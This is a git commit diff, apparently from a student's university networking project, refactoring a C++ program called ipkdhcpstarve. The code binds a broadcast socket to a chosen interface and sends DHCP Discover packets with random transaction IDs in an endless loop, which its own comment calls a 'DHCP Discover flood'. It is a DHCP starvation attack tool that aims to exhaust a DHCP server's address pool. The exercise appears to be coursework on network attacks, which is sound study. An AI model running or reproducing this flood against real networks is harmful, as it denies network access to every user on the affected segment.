e75b0f8dcacf5b4a05c2b96ea43787d2c4149777
Martin Benes <xbenes49@stud.fit.vutbr.cz>
2018-04-08 09:31:17 +0200

    final

--- ipk.cpp
+++ ipk.cpp
@@ -1,47 +1,22 @@
 
 // C
-#include <cstdlib>
-#include <errno.h>
-#include <signal.h>
 #include <cstring>
 #include <unistd.h>
 // C++
 #include <iostream>
-#include <string>
 // net
 #include <arpa/inet.h>
-#include <linux/if.h>
-#include <linux/if_packet.h>
-#include <net/ethernet.h>
-#include <netinet/ether.h>
-#include <netinet/in.h>
-#include <netinet/ip.h>
-#include <netinet/udp.h>
-#include <sys/ioctl.h>
 
-#include "defs.h"
+// user
+#include "ipk.h"
 
 using namespace std;
 
-/** @brief SIGINT handler. */
-void sigint(int);
-
-
-/* ----- DATA ----- */
-char * ifce;
-u_int32_t xid;         /**< Transaction ID. */
-in_addr_t yiaddr; /**< Assigned address. */
-/* ---------------- */
-
-/**
- * @brief Creates socket.
- * @param ifce      Interface name.
- */
-Socket createSocket(char * ifce);
 /**
  * @brief Sends broadcast DHCP Discover packet.
+ * @param sock      Socket to send DHCP Discover to.
  */
-void send_DHCP_DISCOVER();
+void send_DHCP_DISCOVER(int);
 
 
 /**
@@ -52,56 +27,37 @@ int main(int argc, char *argv[])
     // argument processing
     if(argc != 3 || string(argv[1]) != "-i")
     { cerr << "Usage: ./ipkdhcpstarve -i <interface>\n"; exit(ARG_ERR); }
-    ifce = argv[2];
+    const char * ifce = argv[2];
 
-    srand(time(NULL)); // sets rand()
 
-    // DHCP communication
-    while(true) {
-        send_DHCP_DISCOVER();       // send DHCP Discover
-    }
+    //  create socket
+    Socket sock = Socket();
+    if(!sock.opened()) { cerr << "socket() failed.\n"; exit(SOCK_ERR); }
+    // sets debug
+    if(!sock.set(SO_DEBUG))
+    { cerr << "setsockopt(SO_DEBUG) failed.\n"; exit(SOCK_ERR); }
+    // sets reuse address
+    if(!sock.set(SO_REUSEADDR)) { cerr << "setsockopt(SO_REUSEADDR) failed.\n"; exit(SOCK_ERR); }
+    // sets broadcast
+    if(!sock.set(SO_BROADCAST)) { cerr << "setsockopt(SO_BROADCAST) failed.\n"; exit(SOCK_ERR); }
+    // sets socket to device
+    if(setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, ifce, strlen(ifce)) < 0) { cerr << "setsockopt(SO_BINDTODEVICE) failed.\n"; exit(SOCK_ERR); }
+    srand(time(NULL));
+
+    
+    // DHCP Discover flood
+    while(true) { send_DHCP_DISCOVER(sock); /*usleep(1000);*/ }
     return 0;
 }
 
-Socket createSocket()
+
+void send_DHCP_DISCOVER(int sock)
 {
-    Socket sock = Socket();
-
-    //  create socket
-    if(!sock.opened()) { cerr << "socket() failed.\n"; exit(SOCK_ERR); } 
-    else { cerr << "socket() succeeded.\n"; }
-
-    // sets debug
-    if(!sock.set(SO_DEBUG)) 
-    { cerr << "setsockopt(SO_DEBUG) failed.\n"; exit(SOCK_ERR); } 
-    else { cerr << "setsockopt(SOL_DEBUG) succeeded.\n"; }
-
-    // sets reuse address
-    if(!sock.set(SO_REUSEADDR)) 
-    { cerr << "setsockopt(SO_REUSEADDR) failed.\n"; exit(SOCK_ERR); } 
-    else { cerr << "setsockopt(SOL_REUSEADDR) succeeded.\n"; }
-
-    // sets broadcast
-    if(!sock.set(SO_BROADCAST)) 
-    { cerr << "setsockopt(SO_BROADCAST) failed.\n"; exit(SOCK_ERR); } 
-    else { cerr << "setsockopt(SOL_BROADCAST) succeeded.\n"; }
-
-    // sets socket to device
-    if(setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, ifce, strlen(ifce)) < 0)
-    { cerr << "setsockopt(SO_BINDTODEVICE) failed.\n"; exit(SOCK_ERR); } 
-    else { cerr << "setsockopt(SO_BINDTODEVICE) succeeded.\n"; }
-
-    return sock;
-}
-
-void send_DHCP_DISCOVER()
-{
-    Socket sock = createSocket();
     DHCPPacket dhcp;
     
     /* --------- DHCP -------- */
     dhcp.op = DHCPDISCOVER; // msg type
-    dhcp.xid = xid = rand(); // transaction id
+    dhcp.xid = rand(); // transaction id
     dhcp.ciaddr = inet_addr("0.0.0.0"); // client ip
     dhcp.yiaddr = inet_addr("0.0.0.0"); // client ip
     dhcp.siaddr = inet_addr("0.0.0.0"); // ip of next server to talk to
@@ -129,9 +85,6 @@ void send_DHCP_DISCOVER()
     /* ------------------ */
 
     int b;
-    if((b = sendto(sock, &dhcp, sizeof(dhcp), 0, (struct sockaddr *)&addr, sizeof(addr))) < 0)
-    { cerr << "sendto() failed.\n"; exit(SOCK_ERR); }
-    else { cerr << "sendto() succeeded.\n"; }
+    if( (b = sendto(sock, &dhcp, sizeof(dhcp), 0, (struct sockaddr *)&addr, sizeof(addr))) < 0)
+        { cerr << "sendto() failed.\n"; exit(SOCK_ERR); }
 }
-
-void sigint(int) { exit(0); }
